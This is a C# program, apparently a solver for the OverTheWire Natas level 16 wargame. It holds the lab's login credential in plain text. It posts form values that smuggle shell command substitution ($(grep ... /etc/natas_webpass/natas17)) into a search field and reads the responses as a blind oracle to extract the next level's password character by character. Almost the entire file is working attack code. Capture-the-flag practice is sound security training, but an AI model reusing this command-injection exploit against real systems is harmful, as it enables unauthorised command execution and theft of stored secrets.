using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace natec16
{
    class Program
    {
        static void Main(string[] args)
        {
            Task t = new Task(HttpMethod);
            t.Start();
            Console.ReadLine();
        }
        static async void HttpMethod()
        {
            string allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            string login = "natas16";
            string pass = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh";
            string link = "http://natas16.natas.labs.overthewire.org/index.php?#debug";
            string existChar = "";
            string existChar1 = "bcdghkmnqrswAGHNPQSW035789";
            string password = "";
            Stopwatch timer = new Stopwatch();
            timer.Start();

            HttpClientHandler handler = new HttpClientHandler();
            handler.Credentials = new NetworkCredential(login, pass);//stworzenie uchwytu z hasłem
            HttpClient client = new HttpClient(handler);
            Console.WriteLine("Prosze czekac.");
            for (int i = 0; i < allChars.Length; i++)
            {
                var values = new Dictionary<string, string>
                {
                    { "needle", "africa$(grep "+ allChars[i]+" /etc/natas_webpass/natas17)" },

                };

                var content = new FormUrlEncodedContent(values);
                var response = await client.PostAsync(link, content);
                var allContent = await response.Content.ReadAsStringAsync();// wyswietlenie całej zawartości strony
                                                                            //Console.WriteLine("{0}", response);// reasonphrase "ok" znaczy zie login i haslo do strony sa dobre
                                                                            //Console.WriteLine("{0}", allContent);
                int index = allContent.IndexOf("Output");
                string contentOnly = allContent.Substring(index);
                //index = contentOnly.IndexOf("Africa");
                //contentOnly = contentOnly.Substring(index);
                //Console.WriteLine("{0}", contentOnly);

                if (contentOnly.Contains("Africa"))
                {
                    //Console.WriteLine("weszlo");
                }
                else
                {
                    existChar += allChars[i];
                }
            }
            Console.WriteLine("characters in pass: {0}", existChar);

            for (int j = 0; j < 32; j++)
            {
                for (int i = 0; i < existChar.Length; i++)
                {
                    var values = new Dictionary<string, string>
                {
                    { "needle", "africa$(grep ^"+ password + existChar[i]+" /etc/natas_webpass/natas17)" },

                };

                    var content = new FormUrlEncodedContent(values);
                    var response = await client.PostAsync(link, content);
                    var allContent = await response.Content.ReadAsStringAsync();// wyswietlenie całej zawartości strony
                                                                                //Console.WriteLine("{0}", response);// reasonphrase "ok" znaczy zie login i haslo do strony sa dobre
                                                                                //Console.WriteLine("{0}", allContent);
                    int index = allContent.IndexOf("Output");
                    string contentOnly = allContent.Substring(index);
                    //index = contentOnly.IndexOf("Africa");
                    //contentOnly = contentOnly.Substring(index);
                    //Console.WriteLine("{0}", contentOnly);

                    if (contentOnly.Contains("Africa"))
                    {
                        //Console.WriteLine("weszlo");
                    }
                    else
                    {
                        password += existChar[i];
                        Console.WriteLine("{0}", password);
                        break;
                    }
                }
            }

            timer.Stop();
            Console.WriteLine("{0} ms", timer.ElapsedMilliseconds);
            Console.WriteLine("Password: {0}", password);


        }
    }
}
